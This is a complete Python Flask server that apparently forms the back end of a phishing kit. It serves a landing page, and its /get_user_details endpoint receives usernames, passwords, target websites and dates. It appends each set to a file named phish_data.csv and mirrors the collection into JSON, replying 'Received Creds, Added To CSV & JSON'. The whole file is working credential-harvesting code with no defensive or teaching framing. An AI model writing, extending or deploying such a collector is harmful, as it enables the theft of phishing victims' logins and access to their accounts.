from flask import Flask, request, send_from_directory
import json
import os

app = Flask(__name__, static_folder="public", static_url_path="")

csv_file_path = "/app/infoman/phish_data.csv"
json_file_path = "/app/infoman/phish_data.json"


def csv_to_json(csv_file_path):
    creds_json = []

    with open(csv_file_path, "r") as the_file:
        for one_line in the_file:
            one_line_list = one_line.split(",")
            username = one_line_list[0].strip()
            password = one_line_list[1].strip()
            website = one_line_list[2].strip()
            date_now = one_line_list[3].strip()
            creds_json.append(
                {
                    "user_name": username,
                    "pass_word": password,
                    "website": website,
                    "date": date_now,
                }
            )

    creds_json_d = json.dumps(creds_json)
    return creds_json_d


@app.get("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


@app.get("/get_user_details")
def get_user_details():

    username = request.args.get("username")
    password = request.args.get("password")
    website = request.args.get("website")
    date = request.args.get("date")

    csv_d = f"{username},{password},{website},{date}"

    with open(csv_file_path, "a") as the_file:
        the_file.write(f"{csv_d}\n")

    creds_json_d = csv_to_json(csv_file_path)
    with open(json_file_path, "w") as this_json_file:
        this_json_file.write(creds_json_d)

    return "Received Creds, Added To CSV & JSON"


if __name__ == "__main__":
    app.run(debug=True, port=5000, host="0.0.0.0")
